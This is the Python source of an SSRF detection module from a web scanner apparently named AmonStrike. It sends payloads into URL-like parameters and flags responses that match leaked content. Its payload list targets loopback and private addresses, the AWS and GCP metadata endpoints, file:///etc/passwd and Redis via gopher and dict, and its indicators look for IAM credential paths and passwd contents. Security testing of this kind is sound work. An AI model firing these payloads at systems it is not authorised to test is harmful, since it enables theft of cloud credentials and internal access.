"""AmonStrike — SSRF Module"""
from urllib.parse import parse_qs, urlparse
from .base import BaseModule

class SsrfModule(BaseModule):
    NAME = "ssrf"
    DESCRIPTION = "Server-Side Request Forgery — internal network access"

    SSRF_PAYLOADS = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://169.254.169.254/",  # AWS metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://192.168.0.1/",
        "http://10.0.0.1/",
        "http://172.16.0.1/",
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/",
        "gopher://127.0.0.1:6379/_INFO",
    ]

    SSRF_INDICATORS = [
        "root:x:0:0",                    # LFI via file://
        "ami-id",                         # AWS metadata
        "instance-id",                    # Cloud metadata
        "computeMetadata",               # GCP metadata
        "iam/security-credentials",      # AWS IAM
    ]

    def run(self):
        self.log("Testing for SSRF vulnerabilities...")
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)

        url_params = {k: v[0] for k, v in params.items()
                     if any(s in k.lower() for s in ["url", "uri", "href", "src", "redirect", "fetch", "load", "link", "callback", "return"])}

        if not url_params:
            url_params = {"url": "http://example.com", "redirect": "/home"}

        for param, orig in url_params.items():
            for payload in self.SSRF_PAYLOADS[:8]:
                resp = self.get(params={param: payload})
                if resp:
                    if any(ind in resp.text for ind in self.SSRF_INDICATORS):
                        self.add_finding(
                            title=f"SSRF — Internal Resource Access via {param}",
                            severity="CRITICAL",
                            description=f"SSRF in parameter '{param}'. Server is fetching internal resources on behalf of the attacker. Cloud metadata or internal services may be accessible.",
                            evidence=f"Parameter: {param}\nPayload: {payload}\nResponse contains internal content",
                            remediation="Validate URLs against an allowlist of permitted domains. Block internal IP ranges. Use DNS rebinding protection.",
                            url=resp.url,
                            cve="CWE-918"
                        )
                        break
                    elif resp.status_code == 200 and "169.254.169.254" in payload:
                        self.add_finding(
                            title=f"Potential SSRF — Cloud Metadata Endpoint Reached",
                            severity="HIGH",
                            description=f"Request to AWS metadata endpoint returned 200. Confirm manually.",
                            evidence=f"GET {self.url}?{param}={payload} → 200",
                            remediation="Block IMDS access. Use IMDSv2 on AWS. Implement SSRF protection.",
                            url=self.url,
                            cve="CWE-918"
                        )

        self.log(f"SSRF scan complete — {len(self.findings)} findings", "+")
        return self.result()
